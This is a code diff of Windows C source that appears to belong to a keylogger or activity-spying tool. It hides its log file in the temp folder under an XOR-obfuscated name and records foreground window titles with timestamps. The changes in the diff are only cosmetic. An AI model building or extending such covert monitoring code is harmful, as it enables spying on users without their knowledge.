@@ -7,10 +7,10 @@ void CreateLogFile(void)
     GetTempPathW(MAX_PATH, tempPath);
     
     char    *file = "5B63476D485A7C0E464443";
-
     char    *res = (char *)XorStrings(file);
     size_t  len = strlen(file);
     wchar_t log[12];
+
     mbstowcs_s(&len, log, len, res, len);
     wcscat_s(tempPath, MAX_PATH, log);
 
@@ -39,8 +39,7 @@ char    *GetMyLocalTime(void)
     if (localtime_s(&tm_info, &t) != 0)
         return (NULL);
 
-    // string format: "[DD.MM.YYYY HH:MM:SS]" + \0 = 22
-    buffer = malloc(22);
+    buffer = malloc(sizeof(char) * 22);
     if (!buffer)
         return (NULL);
 
@@ -65,7 +64,7 @@ void _GetForegroundWindow(HWND hwnd)
 {
 	wchar_t windowTitleW[256];
 	if (!GetWindowTextW(hwnd, windowTitleW, sizeof(windowTitleW) / sizeof(wchar_t)))
-		return;
+		return ;
 
 	int i = 0;
 	while (windowTitleW[i] != '\0' && i < 256 - 1)
@@ -77,9 +76,9 @@ void _GetForegroundWindow(HWND hwnd)
 	windowTitleW[i] = '\0';
 
 	int utf8Len = WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, NULL, 0, NULL, NULL);
-	char *windowTitleUtf8 = (char*)malloc(utf8Len);
+	char *windowTitleUtf8 = (char*)malloc(sizeof(char) * utf8Len);
 	if (!windowTitleUtf8)
-		return;
+		return ;
 
 	WideCharToMultiByte(CP_UTF8, 0, windowTitleW, -1, windowTitleUtf8, utf8Len, NULL, NULL);
 
@@ -87,7 +86,7 @@ void _GetForegroundWindow(HWND hwnd)
 	if (!dateStr)
 	{
 		free(windowTitleUtf8);
-		return;
+		return ;
 	}
 
 	char logEntry[1024];
